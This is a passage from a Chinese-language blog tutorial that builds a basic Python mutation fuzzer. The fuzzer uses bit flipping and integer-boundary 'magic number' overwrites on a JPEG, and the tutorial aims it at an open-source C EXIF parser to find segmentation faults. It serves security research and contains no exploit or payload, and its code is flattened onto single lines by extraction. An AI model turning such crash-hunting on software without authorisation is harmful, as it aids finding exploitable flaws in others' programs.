data, JFIF standard <span class="hljs-number">1.01</span>, resolution (DPI), density <span class="hljs-number">72</span>x72, segment length <span class="hljs-number">16</span>, Exif Standard: [TIFF image data, little-endian, direntries=<span class="hljs-number">11</span>, manufacturer=Canon, model=Canon EOS <span class="hljs-number">40</span>D, orientation=upper-left, xresolution=<span class="hljs-number">166</span>, yresolution=<span class="hljs-number">174</span>, resolutionunit=<span class="hljs-number">2</span>, software=GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>, datetime=<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>, GPS-Data], baseline, precision <span class="hljs-number">8</span>, <span class="hljs-number">100</span>x68, components <span class="hljs-number">3</span></code></pre><p>如果我们 <code>hexdump</code> 这个图片，我们可以看到最初的几个字节和最后的几个字节实际上就是<code>0xFFD8</code>和<code>0xFFD9</code></p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# hexdump Canon<span class="hljs-number">0000000</span> d8ff e0ff <span class="hljs-number">1000</span> <span class="hljs-number">464</span>a <span class="hljs-number">4649</span> <span class="hljs-number">0100</span> <span class="hljs-number">0101</span> <span class="hljs-number">4800</span>------SNIP------<span class="hljs-number">0001f</span>10 <span class="hljs-number">5</span>aed <span class="hljs-number">5158</span> d9ff</code></pre><p>在规范概述中另外一个有趣的信息是<code>markers</code>是以<code>0xFF</code>开头的，有几种一直的静态标记 (<code>marders</code>) 例如：</p><ul><li>the ‘Start of Image’(SOI) marker: 0xFFD8</li><li>APP1 marker: 0xFFE1</li><li>generic markers: 0xFFXX</li><li>the ‘End of Image’(EOI) marker: 0xFFD9</li></ul><p>因为我们不像去改变<code>image</code>的长度或者文件的类型，所以让我们继续并计划尽可能保持<code>SOI</code>和<code>EOI</code>标记完整，我们并不想插入<code>0xFFD9</code>到图像中间，以至于这会截断图像或者导致解析器以<code>non-crashy way</code>而产生混乱（<code>Non-crashy</code>并不是一个真实的词），这也可能会被误导也许我们也应该在字节流中随机放置<code>EOI</code>标记？来我们试试看。</p><h2 id="Starting-Our-Fuzzer"><a href="#Starting-Our-Fuzzer" class="headerlink" title="Starting Our Fuzzer"></a>Starting Our Fuzzer</h2><p>这我们将做的第一件事情就是提取<code>JPEG</code>中的所有字节，我们希望将其用作我们的<code>valid</code>输入蓝本，当然我们会对其进行变异。</p><p>我们的代码将会从写成这样开始：</p><pre><code class="hljs python3">#!&#x2F;usr&#x2F;bin&#x2F;env python3import sys# read bytes from our valid JPEG and return them in a mutable bytearray def get_bytes(filename):f &#x3D; open(filename, &quot;rb&quot;).read()return bytearray(f)if len(sys.argv) &lt; 2:print(&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;)else:filename &#x3D; sys.argv[1]data &#x3D; get_bytes(filename)</code></pre><p>如果我们希望看到这个数据是长什么样的，我们可以在数组中打印最初10个左右的字节值，然后看看我们将会如何与其进行交互，我们将仅是临时添加一些类似如下的东西：</p><pre><code class="hljs python3">else:filename &#x3D; sys.argv[1]data &#x3D; get_bytes(filename)counter &#x3D; 0for x in data:if counter &lt; 10:print(x)counter +&#x3D; 1</code></pre><p>运行这个，显示我们正将其转换为整齐的十进制整数，在我看来，这让一切变得更为容易。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# python3 fuzzer.py Canon_40D.jpg <span class="hljs-number">255</span><span class="hljs-number">216</span><span class="hljs-number">255</span><span class="hljs-number">224</span><span class="hljs-number">0</span><span class="hljs-number">16</span><span class="hljs-number">74</span><span class="hljs-number">70</span><span class="hljs-number">73</span><span class="hljs-number">70</span></code></pre><p>让我们快速地看看是否可以从我们的字节数组中创建一个新的合规的 <code>JPEG</code>，我们将把这个函数添加到我们的代码中并运行它。</p><pre><code class="hljs python3">def create_new(data):f &#x3D; open(&quot;mutated.jpg&quot;, &quot;wb+&quot;)f.write(data)f.close()</code></pre><p>所以现在在我们的字典中可以获得一个<code>mutated.jpg</code>，让我们<code>hash</code>比较这两个文件，看它们是否匹配的上.</p><pre><code class="hljs llvm">root<span class="hljs-title">@kali</span>:~# shasum Canon_<span class="hljs-number">40</span>D.jpg mutated.jpg <span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">98686223</span>ad<span class="hljs-number">69</span>ea<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>aaab<span class="hljs-number">35</span>d<span class="hljs-number">343</span>ff<span class="hljs-number">1</span>ae<span class="hljs-number">9</span>e  Canon_<span class="hljs-number">40</span>D.jpg<span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">98686223</span>ad<span class="hljs-number">69</span>ea<span class="hljs-number">29</span><span class="hljs-keyword">c</span><span class="hljs-number">811</span>aaab<span class="hljs-number">35</span>d<span class="hljs-number">343</span>ff<span class="hljs-number">1</span>ae<span class="hljs-number">9</span>e  mutated.jpg</code></pre><p>有趣，我们可以有两个相同的文件，现在我们可以在创建<code>mutated.jpg</code>之前变异数据。</p><h2 id="Mutating"><a href="#Mutating" class="headerlink" title="Mutating"></a>Mutating</h2><p>我们将保持我们的 <code>fuzzer</code> 相对简单，并且只是实现两种不同的变异方式，这些方法如下：</p><ul><li>位翻转（<code>bit flipping</code>）</li><li>用<code>Gynvael&#39;s &#39;Magic Numbers&#39;</code>覆盖字节序列（<code>overwriting byte sequences with Gynvael’s ‘Magic Numbers’</code>）</li></ul><p>让我们开始位翻转吧，<code>255</code>（<code>0xFF</code>）在二进制中将是<code>11111111</code>，如果我们随机翻转这个数字中的一位，假设在<code>index</code>数字为<code>2</code>，我们将得到<code>11011111</code>，这个新数字会是<code>223</code>（<code>0xDF</code>）。</p><p>我不能完全确认这种变异方式和随机选择一个<code>0-255</code>的数字并且重写一个新的数字有着什么区别，我的直觉说位翻转与用任意字节随机覆盖字节非常相似。</p><p>让我们继续，假设我们想去仅翻转<code>1%</code>的比特，我们在<code>Python</code>中通过如下代码得到这个数字。</p><pre><code class="hljs lisp">num_of_flips = int((<span class="hljs-name">len</span>(<span class="hljs-name">data</span>) - <span class="hljs-number">4</span>) * .01)</code></pre><p>我们想从我们的字节数组的长度中减去4，因为我们不想计算在我们的数组中的最初的两个字节或最后连个字节，因为这些是<code>SOI</code>和<code>EOI</code>标记，我们意在保持原样。</p><p>接下来我们将想要随机选择许多的<code>indexes</code>然后将这些<code>indexes</code>作为位翻转的目标，我们将继续创建一组可以修改的可能的<code>indexes</code>，然后选择其中的<code>num_of_flips</code>个进行随机的位翻转。</p><pre><code class="hljs python3">indexes &#x3D; range(4, (len(data) - 4))chosen_indexes &#x3D; []# iterate selecting indexes until we&#39;ve hit our num_of_flips numbercounter &#x3D; 0while counter &lt; num_of_flips:chosen_indexes.append(random.choice(indexes))counter +&#x3D; 1</code></pre><p>让我们把<code>import random</code>加到我们的<code>script</code>中，并添加这些<code>debug</code>的<code>print</code>状态以确保所有的一切都能成功运转。</p><pre><code class="hljs python3">print(&quot;Number of indexes chosen: &quot; + str(len(chosen_indexes)))print(&quot;Indexes chosen: &quot; + str(chosen_indexes))</code></pre><p>我们的<code>function</code>现在是像这样：</p><pre><code class="hljs python3">def bit_flip(data):num_of_flips &#x3D; int((len(data) - 4) * .01)indexes &#x3D; range(4, (len(data) - 4))chosen_indexes &#x3D; []# iterate selecting indexes until we&#39;ve hit our num_of_flips numbercounter &#x3D; 0while counter &lt; num_of_flips:chosen_indexes.append(random.choice(indexes))counter +&#x3D; 1print(&quot;Number of indexes chosen: &quot; + str(len(chosen_indexes)))print(&quot;Indexes chosen: &quot; + str(chosen_indexes))</code></pre><p>如果我们跑这个脚本，我们将会得到一个预期的不错的输出。</p><pre><code class="hljs yaml"><span class="hljs-string">root@kali:~#</span> <span class="hljs-string">python3</span> <span class="hljs-string">fuzzer.py</span> <span class="hljs-string">Canon_40D.jpg</span> <span class="hljs-attr">Number of indexes chosen:</span> <span class="hljs-number">79</span><span class="hljs-attr">Indexes chosen:</span> [<span class="hljs-number">6580</span>, <span class="hljs-number">930</span>, <span class="hljs-number">6849</span>, <span class="hljs-number">6007</span>, <span class="hljs-number">5020</span>, <span class="hljs-number">33</span>, <span class="hljs-number">474</span>, <span class="hljs-number">4051</span>, <span class="hljs-number">7722</span>, <span class="hljs-number">5393</span>, <span class="hljs-number">3540</span>, <span class="hljs-number">54</span>, <span class="hljs-number">5290</span>, <span class="hljs-number">2106</span>, <span class="hljs-number">2544</span>, <span class="hljs-number">1786</span>, <span class="hljs-number">5969</span>, <span class="hljs-number">5211</span>, <span class="hljs-number">2256</span>, <span class="hljs-number">510</span>, <span class="hljs-number">7147</span>, <span class="hljs-number">3370</span>, <span class="hljs-number">625</span>, <span class="hljs-number">5845</span>, <span class="hljs-number">2082</span>, <span class="hljs-number">2451</span>, <span class="hljs-number">7500</span>, <span class="hljs-number">3672</span>, <span class="hljs-number">2736</span>, <span class="hljs-number">2462</span>, <span class="hljs-number">5395</span>, <span class="hljs-number">7942</span>, <span class="hljs-number">2392</span>, <span class="hljs-number">1201</span>, <span class="hljs-number">3274</span>, <span class="hljs-number">7629</span>, <span class="hljs-number">5119</span>, <span class="hljs-number">1977</span>, <span class="hljs-number">2986</span>, <span class="hljs-number">7590</span>, <span class="hljs-number">1633</span>, <span class="hljs-number">4598</span>, <span class="hljs-number">1834</span>, <span class="hljs-number">445</span>, <span class="hljs-number">481</span>, <span class="hljs-number">7823</span>, <span class="hljs-number">7708</span>, <span class="hljs-number">6840</span>, <span class="hljs-number">1596</span>, <span class="hljs-number">5212</span>, <span class="hljs-number">4277</span>, <span class="hljs-number">3894</span>, <span class="hljs-number">2860</span>, <span class="hljs-number">2912</span>, <span class="hljs-number">6755</span>, <span class="hljs-number">3557</span>, <span class="hljs-number">3535</span>, <span class="hljs-number">3745</span>, <span class="hljs-number">1780</span>, <span class="hljs-number">252</span>, <span class="hljs-number">6128</span>, <span class="hljs-number">7187</span>, <span class="hljs-number">500</span>, <span class="hljs-number">1051</span>, <span class="hljs-number">4372</span>, <span class="hljs-number">5138</span>, <span class="hljs-number">3305</span>, <span class="hljs-number">872</span>, <span class="hljs-number">6258</span>, <span class="hljs-number">2136</span>, <span class="hljs-number">3486</span>, <span class="hljs-number">5600</span>, <span class="hljs-number">651</span>, <span class="hljs-number">1624</span>, <span class="hljs-number">4368</span>, <span class="hljs-number">7076</span>, <span class="hljs-number">1802</span>, <span class="hljs-number">2335</span>, <span class="hljs-number">3553</span>]</code></pre><p>接下来我们需要实际变异这些<code>indexes</code>上的字节，我们需要位翻转他们，我选择用一个非常<code>hacky</code>的方式去做这件事，你尽可以随意的实现你自己的方法，我们准备转换这些<code>indexes</code>上的字节到二进制字符串，并将其补齐为8位数长，让我们添加这个代码，看看我们在说些什么，我们将会转换这字节的值（就是转为十进制）到二进制串，并如果它少于8位数长时在其前面填充0，这最后一行就是调试时的临时打印。</p><pre><code class="hljs python3">for x in chosen_indexes:    current &#x3D; data[x]    current &#x3D; (bin(current).replace(&quot;0b&quot;,&quot;&quot;))    current &#x3D; &quot;0&quot; * (8 - len(current)) + current</code></pre><p>正如你所示，我们有一个不错的二进制数字作为字符串的输出。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# python3 fuzzer.py Canon_40D.jpg <span class="hljs-number">10100110</span><span class="hljs-number">10111110</span><span class="hljs-number">10010010</span><span class="hljs-number">00110000</span><span class="hljs-number">01110001</span><span class="hljs-number">00110101</span><span class="hljs-number">00110010</span>-----SNIP-----</code></pre><p>现在对于其中的每一个，我们将会随机挑选一个<code>index</code>然后翻转它，例如，<code>10100110</code>，如果选择<code>index 0</code>，我们得到是<code>1</code>，我们将会翻转其成为<code>0</code>。</p><p>这段代码段最后的考虑是这些是字符串而不是整数，所以我们需要做的最后一件事情就是将翻转的二进制字符串转换为整数。</p><p>我们将创建一个空白的列表、把每个数字降入这个列表、翻转我们随机挑选的数字，然后从所有的列表成员中构造一个新的字符串（我们必须使用这个中间列表的步骤，因为字符串是可变异的），最后我们将其转换为整数，然后返回数据给我们的<code>create_new()</code>函数以创建一个新的<code>JPEG</code>。</p><p>我们的全部脚本目前是像这样：</p><pre><code class="hljs python3">#!&#x2F;usr&#x2F;bin&#x2F;env python3import sysimport random# read bytes from our valid JPEG and return them in a mutable bytearray def get_bytes(filename):f &#x3D; open(filename, &quot;rb&quot;).read()return bytearray(f)def bit_flip(data):num_of_flips &#x3D; int((len(data) - 4) * .01)indexes &#x3D; range(4, (len(data) - 4))chosen_indexes &#x3D; []# iterate selecting indexes until we&#39;ve hit our num_of_flips numbercounter &#x3D; 0while counter &lt; num_of_flips:chosen_indexes.append(random.choice(indexes))counter +&#x3D; 1for x in chosen_indexes:current &#x3D; data[x]current &#x3D; (bin(current).replace(&quot;0b&quot;,&quot;&quot;))current &#x3D; &quot;0&quot; * (8 - len(current)) + currentindexes &#x3D; range(0,8)picked_index &#x3D; random.choice(indexes)new_number &#x3D; []# our new_number list now has all the digits, example: [&#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;, &#39;1&#39;, &#39;0&#39;]for i in current:new_number.append(i)# if the number at our randomly selected index is a 1, make it a 0, and vice versaif new_number[picked_index] &#x3D;&#x3D; &quot;1&quot;:new_number[picked_index] &#x3D; &quot;0&quot;else:new_number[picked_index] &#x3D; &quot;1&quot;# create our new binary string of our bit-flipped numbercurrent &#x3D; &#39;&#39;for i in new_number:current +&#x3D; i# convert that string to an integercurrent &#x3D; int(current,2)# change the number in our byte array to our new number we just constructeddata[x] &#x3D; currentreturn data# create new jpg with mutated datadef create_new(data):f &#x3D; open(&quot;mutated.jpg&quot;, &quot;wb+&quot;)f.write(data)f.close()if len(sys.argv) &lt; 2:print(&quot;Usage: JPEGfuzz.py &lt;valid_jpg&gt;&quot;)else:filename &#x3D; sys.argv[1]data &#x3D; get_bytes(filename)mutated_data &#x3D; bit_flip(data)create_new(mutated_data)</code></pre><h2 id="Analyzing-Mutation"><a href="#Analyzing-Mutation" class="headerlink" title="Analyzing Mutation"></a>Analyzing Mutation</h2><p>如果我们跑我们的脚本，我们可以利用<code>shasum</code>这个输出，然后与原本的<code>JPEG</code>进行比较。</p><pre><code class="hljs reasonml">root@kali:~# shasum <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Canon_40D</span>.</span></span>jpg mutated.jpg c3d98686223ad69ea29c811aaab35d343ff1ae9e  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Canon_40D</span>.</span></span>jpga7b619028af3d8e5ac106a697b06efcde0649249  mutated.jpg</code></pre><p>这个看起来很有戏，因为它们现在有着不同的哈希值，我们未来通过用一个程序（被称为<a href="https://www.scootersoftware.com/">Beyond Compare</a>或<code>bcompare</code>）比较它们以进行分析，我们将会有着不同高亮的两个<code>hexdumps</code></p><p><img src="/img/fuzzing_like_a_caveman/bcompare.png" alt="bcompare.png"></p><p>正如你所是，在这一个屏幕的共享中，我们有着三个字节的不同，它们已经进行了它们的位翻转，这个初始的在左侧，而变异的样本在右侧。</p><p>这个变异的方法似乎起作用了，让我们继续实现我们第二个变异的方法。</p><h2 id="Gynvael’s-Magic-Numbers"><a href="#Gynvael’s-Magic-Numbers" class="headerlink" title="Gynvael’s Magic Numbers"></a>Gynvael’s Magic Numbers</h2><p>在前文提到的<code>GynvaelColdwind</code>的<a href="https://www.youtube.com/watch?v=BrDujogxYSk&t=2545">Basics of fuzzing’ stream</a>，他枚举了一些在程序上可以有着毁灭影响的<code>magic numbers</code>，通常，这些数字和数据类型大小和算数引起的错误有关，这些讨论的数字是：</p><ul><li>0xFF</li><li>0x7F</li><li>0x00</li><li>0xFFFF</li><li>0x0000</li><li>0xFFFFFFFF</li><li>0x00000000</li><li>0x80000000 &lt;—- minimum 32-bit int</li><li>0x40000000 &lt;—- just half of that amount</li><li>0x7FFFFFFF &lt;—- max 32-bit int</li></ul><p>如果在<code>malloc()</code>或其他类型的操作过程中对这些类型的值执行任何类型的算术运算，溢出可能就是很常见，例如如果你加<code>0x1</code>到<code>0xFF</code>在一个字节的寄存器上，它将转到<code>0x00</code>，这是无意的行为，<code>HEVD</code>实际上已经有一个与这个理念类似的整数溢出<code>bug</code>。</p><p>假设我们的<code>fuzzer</code>选择<code>0x7FFFFFFF</code>作为它想要使用的魔数，该值是4个字节长，所以我们必须在数组中找到一个字节索引，并覆盖该字节加上接下来的三个字节。让我们继续并开始在我们的<code>fuzzer</code>中实现它。</p><h2 id="Implementing-Mutation-Method-2"><a href="#Implementing-Mutation-Method-2" class="headerlink" title="Implementing Mutation Method #2"></a>Implementing Mutation Method #2</h2><p>首先我们将想要创建一个类似<code>Gynvael</code>做的一个元组列表，在这元组中的第一个数字是<code>magic numbers</code>的字节数，第二个数字是十进制上的字节的值。</p><pre><code class="hljs python3">def magic(data):magic_vals &#x3D; [(1, 255),(1, 255),(1, 127),(1, 0),(2, 255),(2, 0),(4, 255),(4, 0),(4, 128),(4, 64),(4, 127)]picked_magic &#x3D; random.choice(magic_vals)print(picked_magic)</code></pre><p>如果我们跑这个脚本，我门就可以看到它随机在取一个<code>magic</code>值元组</p><pre><code class="hljs python3">root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 64)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 128)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 0)root@kali:~# python3 fuzzer.py Canon_40D.jpg (2, 255)root@kali:~# python3 fuzzer.py Canon_40D.jpg (4, 0)</code></pre><p>我们现在需要用新的<code>magic</code>1到4字节的值复写到<code>JPEG</code>中的1到4字节的值上，我们将要建立我们可能的<code>indexes</code>就像之前那个方法一样，随机选择<code>index</code>然后覆盖这个<code>index</code>上的字节用我们<code>picked_magic</code>数字。</p><p>所以，如果例如我们取的是<code>(4, 128)</code>，我们知道这是4个字节，所以这个魔数是<code>0x80000000</code>，所以我们将做些类似如下的事情：</p><pre><code class="hljs python3">byte[x] &#x3D; 128byte[x+1] &#x3D; 0byte[x+2] &#x3D; 0byte[x+3] &#x3D; 0</code></pre><p>总而言之，我们的函数如下所示：</p><pre><code class="hljs python3">def magic(data):magic_vals &#x3D; [(1, 255),(1, 255),(1, 127),(1, 0),(2, 255),(2, 0),(4, 255),(4, 0),(4, 128),(4, 64),(4, 127)]picked_magic &#x3D; random.choice(magic_vals)length &#x3D; len(data) - 8index &#x3D; range(0, length)picked_index &#x3D; random.choice(index)# here we are hardcoding all the byte overwrites for all of the tuples that begin (1, )if picked_magic[0] &#x3D;&#x3D; 1:if picked_magic[1] &#x3D;&#x3D; 255:# 0xFFdata[picked_index] &#x3D; 255elif picked_magic[1] &#x3D;&#x3D; 127:# 0x7Fdata[picked_index] &#x3D; 127elif picked_magic[1] &#x3D;&#x3D; 0:# 0x00data[picked_index] &#x3D; 0# here we are hardcoding all the byte overwrites for all of the tuples that begin (2, )elif picked_magic[0] &#x3D;&#x3D; 2:if picked_magic[1] &#x3D;&#x3D; 255:# 0xFFFFdata[picked_index] &#x3D; 255data[picked_index + 1] &#x3D; 255elif picked_magic[1] &#x3D;&#x3D; 0:# 0x0000data[picked_index] &#x3D; 0data[picked_index + 1] &#x3D; 0# here we are hardcoding all of the byte overwrites for all of the tuples that being (4, )elif picked_magic[0] &#x3D;&#x3D; 4:if picked_magic[1] &#x3D;&#x3D; 255:# 0xFFFFFFFFdata[picked_index] &#x3D; 255data[picked_index + 1] &#x3D; 255data[picked_index + 2] &#x3D; 255data[picked_index + 3] &#x3D; 255elif picked_magic[1] &#x3D;&#x3D; 0:# 0x00000000data[picked_index] &#x3D; 0data[picked_index + 1] &#x3D; 0data[picked_index + 2] &#x3D; 0data[picked_index + 3] &#x3D; 0elif picked_magic[1] &#x3D;&#x3D; 128:# 0x80000000data[picked_index] &#x3D; 128data[picked_index + 1] &#x3D; 0data[picked_index + 2] &#x3D; 0data[picked_index + 3] &#x3D; 0elif picked_magic[1] &#x3D;&#x3D; 64:# 0x40000000data[picked_index] &#x3D; 64data[picked_index + 1] &#x3D; 0data[picked_index + 2] &#x3D; 0data[picked_index + 3] &#x3D; 0elif picked_magic[1] &#x3D;&#x3D; 127:# 0x7FFFFFFFdata[picked_index] &#x3D; 127data[picked_index + 1] &#x3D; 255data[picked_index + 2] &#x3D; 255data[picked_index + 3] &#x3D; 255return data</code></pre><h2 id="Analyzing-Mutation-2"><a href="#Analyzing-Mutation-2" class="headerlink" title="Analyzing Mutation #2"></a>Analyzing Mutation #2</h2><p>现在我们运行脚本，然后在<code>Beyond Compare</code>中分析结果，我们可以看到这个两个字节的<code>0xA6 0x76</code>将被复写成<code>0xFF 0xFF</code>。</p><p><img src="/img/fuzzing_like_a_caveman/bcompare2.png" alt="bcompare2.png"></p><p>这正是我们想实现的。</p><h2 id="Starting-to-Fuzz"><a href="#Starting-to-Fuzz" class="headerlink" title="Starting to Fuzz"></a>Starting to Fuzz</h2><p>现在我们有了两个可靠的编译数据的方法，我们需要做：</p><ul><li>用我们的函数的其中一个变异数据</li><li>用变异的数据创建一个新的图片</li><li>把变异的图片喂给我们的二进制用于解析</li><li>捕获任何<code>Segmentation faults</code>并且<code>log</code>产生这个的图片</li></ul><h3 id="Victim"><a href="#Victim" class="headerlink" title="Victim?"></a>Victim?</h3><p>对于我们的受害者程序，我们将用<code>site:github.com &quot;exif&quot; language:c</code>搜索<code>Google</code>，以找到用 C 编写的引用了<code>exif</code>的<code>Github</code>项目。</p><p>快速浏览将我们带到<code>https://github.com/mkttanabe/exif</code></p><p>我们可以通过<code>git cloning</code>这个仓库和用<code>README</code>中的<code>building with gcc</code>指令来安装该程序（我已经把编译好的二进制文件放到了<code>/usr/bin</code>，仅仅是为了方便）</p><p>让我们先来看看这个程序怎么处理我们合规的<code>JPEG</code>吧。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# exif Canon_40D.jpg -verbosesystem: little-endian  data: little-endian[Canon_40D.jpg] createIfdTableArray: result=<span class="hljs-number">5</span>&#123;<span class="hljs-number">0</span>TH IFD&#125; tags=<span class="hljs-number">11</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x010F</span> Make        type=<span class="hljs-number">2</span> count=<span class="hljs-number">6</span> val=[Canon]tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x0110</span> Model        type=<span class="hljs-number">2</span> count=<span class="hljs-number">14</span> val=[Canon EOS <span class="hljs-number">40</span>D]tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x0112</span> Orientation        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x011A</span> XResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x011B</span> YResolution        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">72</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x0128</span> ResolutionUnit        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">06</span>] <span class="hljs-number">0x0131</span> Software        type=<span class="hljs-number">2</span> count=<span class="hljs-number">11</span> val=[GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>]tag[<span class="hljs-number">07</span>] <span class="hljs-number">0x0132</span> DateTime        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>]tag[<span class="hljs-number">08</span>] <span class="hljs-number">0x0213</span> YCbCrPositioning        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">2</span> tag[<span class="hljs-number">09</span>] <span class="hljs-number">0x8769</span> ExifIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">214</span> tag[<span class="hljs-number">10</span>] <span class="hljs-number">0x8825</span> GPSInfoIFDPointer        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">978</span> &#123;EXIF IFD&#125; tags=<span class="hljs-number">30</span>tag[<span class="hljs-number">00</span>] <span class="hljs-number">0x829A</span> ExposureTime        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span>/<span class="hljs-number">160</span> tag[<span class="hljs-number">01</span>] <span class="hljs-number">0x829D</span> FNumber        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">71</span>/<span class="hljs-number">10</span> tag[<span class="hljs-number">02</span>] <span class="hljs-number">0x8822</span> ExposureProgram        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">03</span>] <span class="hljs-number">0x8827</span> PhotographicSensitivity        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">100</span> tag[<span class="hljs-number">04</span>] <span class="hljs-number">0x9000</span> ExifVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> tag[<span class="hljs-number">05</span>] <span class="hljs-number">0x9003</span> DateTimeOriginal        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]tag[<span class="hljs-number">06</span>] <span class="hljs-number">0x9004</span> DateTimeDigitized        type=<span class="hljs-number">2</span> count=<span class="hljs-number">20</span> val=[<span class="hljs-number">2008</span>:<span class="hljs-number">05</span>:<span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span>]tag[<span class="hljs-number">07</span>] <span class="hljs-number">0x9101</span> ComponentsConfiguration        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0x01</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> tag[<span class="hljs-number">08</span>] <span class="hljs-number">0x9201</span> ShutterSpeedValue        type=<span class="hljs-number">10</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">483328</span>/<span class="hljs-number">65536</span> tag[<span class="hljs-number">09</span>] <span class="hljs-number">0x9202</span> ApertureValue        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">368640</span>/<span class="hljs-number">65536</span> tag[<span class="hljs-number">10</span>] <span class="hljs-number">0x9204</span> ExposureBiasValue        type=<span class="hljs-number">10</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">0</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">11</span>] <span class="hljs-number">0x9207</span> MeteringMode        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">5</span> tag[<span class="hljs-number">12</span>] <span class="hljs-number">0x9209</span> Flash        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">9</span> tag[<span class="hljs-number">13</span>] <span class="hljs-number">0x920A</span> FocalLength        type=<span class="hljs-number">5</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">135</span>/<span class="hljs-number">1</span> tag[<span class="hljs-number">14</span>] <span class="hljs-number">0x9286</span> UserComment        type=<span class="hljs-number">7</span> count=<span class="hljs-number">264</span> val=<span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> (omitted)tag[<span class="hljs-number">15</span>] <span class="hljs-number">0x9290</span> SubSecTime        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">16</span>] <span class="hljs-number">0x9291</span> SubSecTimeOriginal        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">17</span>] <span class="hljs-number">0x9292</span> SubSecTimeDigitized        type=<span class="hljs-number">2</span> count=<span class="hljs-number">3</span> val=[<span class="hljs-number">00</span>]tag[<span class="hljs-number">18</span>] <span class="hljs-number">0xA000</span> FlashPixVersion        type=<span class="hljs-number">7</span> count=<span class="hljs-number">4</span> val=<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> tag[<span class="hljs-number">19</span>] <span class="hljs-number">0xA001</span> ColorSpace        type=<span class="hljs-number">3</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">1</span> tag[<span class="hljs-number">20</span>] <span class="hljs-number">0xA002</span> PixelXDimension        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">100</span> tag[<span class="hljs-number">21</span>] <span class="hljs-number">0xA003</span> PixelYDimension        type=<span class="hljs-number">4</span> count=<span class="hljs-number">1</span> val=<span class="hljs-number">68</span> tag[<span class="hljs-number">22</span>] <span 